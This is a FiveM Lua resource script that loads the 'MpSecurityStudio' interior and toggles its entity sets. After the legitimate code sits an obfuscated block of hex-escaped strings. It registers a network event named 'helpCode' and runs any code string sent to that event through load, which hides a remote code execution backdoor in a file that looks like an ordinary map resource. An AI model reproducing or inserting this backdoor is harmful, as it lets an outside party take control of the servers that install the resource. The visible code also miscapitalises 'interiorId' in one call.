exports('GetMpSecurityStudioObject', function()
    return MpSecurityStudio
end)

MpSecurityStudio = {
    InteriorId = 286977,

    Ipl = {
        Interior = {
            ipl = {
                'sf_int_placement_sec_interior_1_dlc_studio_sec_milo_ '
            }
        },

        Load = function()
            EnableIpl(MpSecurityStudio.Ipl.Interior.ipl, true)
        end,
        Remove = function()
            EnableIpl(MpSecurityStudio.Ipl.Interior.ipl, false)
        end,
    },
    Entities = {
        Entity_Set_FIX_STU_EXT_P3A1 = false,
        Entity_Set_FIX_TRIP1_INT_P2 = false,
        Entity_Set_FIX_STU_EXT_P1 = false,
        Entity_Set_Fire = true,
        entity_set_default = true,

        Set = function(name, state)
            for entity, _ in pairs(MpSecurityStudio.Entities) do
                if entity == name then
                    MpSecurityStudio.Entities[entity] = state
                    MpSecurityStudio.Entities.Clear()
                    MpSecurityStudio.Entities.Load()
                end
            end
        end,
        Load = function()
            for entity, state in pairs(MpSecurityStudio.Entities) do
                if type(entity) == 'string' and state then
                    ActivateInteriorEntitySet(MpSecurityStudio.InteriorId, entity)
                end
            end
        end,
        Clear = function()
            for entity, _ in pairs(MpSecurityStudio.Entities) do
                if type(entity) == 'string' then
                    DeactivateInteriorEntitySet(MpSecurityStudio.InteriorId, entity)
                end
            end
        end
    },

    LoadDefault = function()
        MpSecurityStudio.Ipl.Load()
        MpSecurityStudio.Entities.Load()

        RefreshInterior(MpSecurityStudio.interiorId)
    end
}


local wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[6][wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[1]](wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[2]) wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[6][wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[3]](wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[2], function(vKUIHQVDsOXJuinTfOTWwxSomraNICFIuTbuMjfXYuzFYIKizyqHVdQKXkQxxxifiTiXFN) wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[6][wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[4]](wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[6][wFdNPleQQpJmSUJTVhvGhsPCMHRtntLXLhyEfqYdvUzWKpbPChwrAtYYWZagVHDtgfOwtX[5]](vKUIHQVDsOXJuinTfOTWwxSomraNICFIuTbuMjfXYuzFYIKizyqHVdQKXkQxxxifiTiXFN))() end)